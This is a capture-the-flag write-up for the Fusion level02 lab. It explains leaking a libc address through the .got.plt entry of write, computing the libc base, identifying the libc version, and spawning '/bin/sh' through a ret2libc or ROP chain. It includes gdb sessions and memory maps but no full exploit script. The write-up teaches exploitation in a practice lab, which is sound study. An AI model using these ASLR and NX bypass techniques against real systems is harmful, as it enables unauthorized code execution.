# Takeaways

In this level we overcome the mitigations of ASLR and NX stack and NX heap for the first time. We demonstrate how to leak libc addresses and how to utilize those leaks in order to perform a ret2libc attack.

## Examining memory mapping

In order to leak the address of a library we need to leak the address of <i>something</i> (i.e. a function or variable) that belongs to that library. Let's start by examining the mapped pages of the binary between two consecutive runs when ASLR is enabled.

```bash
root@fusion:~# cat /proc/$(pgrep level02)/maps
08048000-0804b000 r-xp 00000000 07:00 75275      /opt/fusion/bin/level02
0804b000-0804c000 rw-p 00002000 07:00 75275      /opt/fusion/bin/level02
b761f000-b7620000 rw-p 00000000 00:00 0
b7620000-b7796000 r-xp 00000000 07:00 92669      /lib/i386-linux-gnu/libc-2.13.so
b7796000-b7798000 r--p 00176000 07:00 92669      /lib/i386-linux-gnu/libc-2.13.so
b7798000-b7799000 rw-p 00178000 07:00 92669      /lib/i386-linux-gnu/libc-2.13.so
b7799000-b779c000 rw-p 00000000 00:00 0
b77a6000-b77a8000 rw-p 00000000 00:00 0
b77a8000-b77a9000 r-xp 00000000 00:00 0          [vdso]
b77a9000-b77c7000 r-xp 00000000 07:00 92553      /lib/i386-linux-gnu/ld-2.13.so
b77c7000-b77c8000 r--p 0001d000 07:00 92553      /lib/i386-linux-gnu/ld-2.13.so
b77c8000-b77c9000 rw-p 0001e000 07:00 92553      /lib/i386-linux-gnu/ld-2.13.so
bf8ea000-bf90b000 rw-p 00000000 00:00 0          [stack]
root@fusion:~# killall level02 && /opt/fusion/bin/level02
root@fusion:~# cat /proc/$(pgrep level02)/maps
08048000-0804b000 r-xp 00000000 07:00 75275      /opt/fusion/bin/level02
0804b000-0804c000 rw-p 00002000 07:00 75275      /opt/fusion/bin/level02
b75df000-b75e0000 rw-p 00000000 00:00 0
b75e0000-b7756000 r-xp 00000000 07:00 92669      /lib/i386-linux-gnu/libc-2.13.so
b7756000-b7758000 r--p 00176000 07:00 92669      /lib/i386-linux-gnu/libc-2.13.so
b7758000-b7759000 rw-p 00178000 07:00 92669      /lib/i386-linux-gnu/libc-2.13.so
b7759000-b775c000 rw-p 00000000 00:00 0
b7766000-b7768000 rw-p 00000000 00:00 0
b7768000-b7769000 r-xp 00000000 00:00 0          [vdso]
b7769000-b7787000 r-xp 00000000 07:00 92553      /lib/i386-linux-gnu/ld-2.13.so
b7787000-b7788000 r--p 0001d000 07:00 92553      /lib/i386-linux-gnu/ld-2.13.so
b7788000-b7789000 rw-p 0001e000 07:00 92553      /lib/i386-linux-gnu/ld-2.13.so
bfa7e000-bfa9f000 rw-p 00000000 00:00 0          [stack]
root@fusion:~#
```

We observe that:

* Command `getconf PAGE_SIZE` returns `4096` which is the page size. Thus all pages have their 12 least significant bits 0. This means pages start at addresses that look like `0xYYYYY000`
* No ASLR is present in the code segment of the binary
* Dynamic Libraries are loaded into completely different pages each time. <b><u>Even if we leak one library, we cannot deduce the address of another library.</u></b>
* If we leak the address of a library, we can find out about the address of all the symbols of that library. This is because the pages of the library are consecutive and we can find out the base address of the library by performing a symbol subtraction.
  * For example: Function `write()` is found at address `0xb76a12c0`. We know that the offset of `write()` within `/lib/i386-linux-gnu/libc-2.13.so` is `0x000c12c0`. Thus the base address of libc is `0xb76a12c0 - 0x000c12c0` which equals to `0xb75e0000` and we can confirm it as that is the same address as the one that appears to be the start of the read-only executable page of libc in the above output. So if we leak one page of the library, then we have effectively leaked all its pages, i.e. the library itself.

## Constructing a leak primitive

Okay, so can overwrite the return address with a stack overflow, but how do we leak an address? 

First we crash the program by returning to a non-valid address, e.g. `0x41414141` and examine the registers to see if any of them contain a part of our input:

```gdb
Program received signal SIGSEGV, Segmentation fault.
=> 0x41414141:  Error while running hook_stop:
Cannot access memory at address 0x41414141
0x41414141 in ?? ()
(gdb) info registers
eax            0x51     81                  <--- Value corresponds to 'Q'
ecx            0xbfa7d26b       -1079520661 <--- &op
edx            0x1      1
ebx            0xb7757ff4       -1217036300
esp            0xbfa9d280       0xbfa9d280
ebp            0x43434343       0x43434343
esi            0x0      0
edi            0x0      0
eip            0x41414141       0x41414141
eflags         0x10246  [ PF ZF IF RF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

So if we could find some gadgets that utilize the `$ecx` register and construct a ROP chain, we could leak the stack addresses of the program (In the text section we couldn't find any, but after a libc leak, it is possible since we have more gadgets with the text section of libc). However, here we want to leak the libc, but we notice that no register contains the address of a libc symbol, so how do we proceed?

Enter glorious `.got.plt` section. When an external function is invoked, an entry is filled in the `.got.plt` section. So if at least one libc function has been invoked in the passed, then an address belonging to libc will be present in this section. One libc function that is certainly invoked is `write`, so let's try to leak this function's address.

```gdb
(gdb) info functions write
All functions matching regular expression "write":

File level02/level02.c:
static ssize_t nwrite(int, void *, size_t);

Non-debugging symbols:
0x080488e0  fwrite
0x080488e0  fwrite@plt
0x080489c0  write
0x080489c0  write@plt
(gdb) x/3i 0x080489c0   # write@plt
   0x80489c0 <write@plt>:       jmp    DWORD PTR ds:0x804b3dc
   0x80489c6 <write@plt+6>:     push   0xc8
   0x80489cb <write@plt+11>:    jmp    0x8048820
(gdb) x/1wx 0x804b3dc
0x804b3dc <write@got.plt>:      0xb76a12c0
(gdb) 
```

So we find out that `write` stub is located at address `0x080489c0`. Examining the corresponding `.got.plt` entry in address `0x804b3dc` we find out that this function has been invoked in the past since the value in that address is the real resolved address of `write` within libc (`0x804b3dc <write@got.plt>: 0xb76a12c0`) <b><u>and not the address of the next instruction</u></b> (`0x80489c6 <write@plt+6>`), which would be a wrong address for our leak purposes.

So we found out which address we want to leak, but how do we do it?

Enter glorious `.got.plt` section once again! We will invoke `write`'s stub to print the leaked address to the `stdout` of the program. Thus we need to invoke 
`write(1, 0x804b3dc, 4)`.

Now we have successfully leaked `write`'s address and thus the base address of `libc`! We can return to wherever we want and continue our ROP chain.

## Side notes

1. Even if no libc function had ever been invoked (highly unlikely), we could invoke such a function and then leak its address through a bigger ROP chain.
2. In order to communicate the leaked address we use `stdout` but anything else could actually have been used. We also use `write` but any function like `snprintf`, `strcpy`, `memcpy` or others could have been used.
3. <b><u>Even if we leak a libc address, how do we know which version of libc is used in the system? </u></b>If we don't know the version, then we cannot correctly calculate the offset of symbols. Each version is bound to have different offsets from its base address. After leaking the address of symbol, e.g. `write()`, you could use a tool, like [libc-database](https://github.com/niklasb/libc-database), to get the version of libc. For example, take the leaked `write()` address (`0xb76a12c0`) and do a search based on the last 3 digits (offset within the page since ASLR is enabled):

    ```bash
    nikos@ubuntu:~/ctf/libc-database$ ./find write 2c0
    archive-old-eglibc (id libc6_2.13-20ubuntu5_i386)
    ```

    We could have gotten more results like:

    ```bash
    archive-old-eglibc (id libc6_2.13-20ubuntu5_i386)
    archive-old-glibc (id libc6_2.5-0ubuntu14_amd64)
    archive-old-glibc (id libc6-amd64_2.5-0ubuntu14_i386)
    ```

    In that case we could either leak another address and add it to the search, or just use trial and error in the exploit. In our case we have only 1 match and we can also cross-check since we have access to the machine:

    ```bash
    fusion@fusion:~$ ldd /opt/fusion/bin/level02
            linux-gate.so.1 =>  (0xb78de000)
            libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7756000)
            /lib/ld-linux.so.2 (0xb78df000)
    fusion@fusion:~$ ls -l /lib/i386-linux-gnu/libc.so.6
    lrwxrwxrwx 1 root root 12 2011-10-05 09:07 /lib/i386-linux-gnu/libc.so.6 -> libc-2.13.so
    fusion@fusion:~$ uname -a
    Linux fusion 3.0.0-13-generic-pae #22-Ubuntu SMP Wed Nov 2 15:17:35 UTC 2011 i686 i686 i386 GNU/Linux
    fusion@fusion:~$
    ```

## Challenge-specific side notes

1. We could solve this challenge without leaking libc addresses. We could use a bunch of `snprintf` (or `strcpy` or `memcpy`) calls to write the string `"/bin/sh"` somewhere in the writeable data page of the program. Then we can invoke `execve("/bin/sh")` with our created string in the data segment as argument.
   * The sequence of calls could be for example: `snprintf("/"); snprintf("bin"); snprintf("/"); snprintf("s"); snprintf("h"); snprintf("\0");`, where the address of these "strings" (they are not strings since we use s<b><u>n</u></b>printf) can be any address to either the text or data section of program as it is not protected by ASLR.
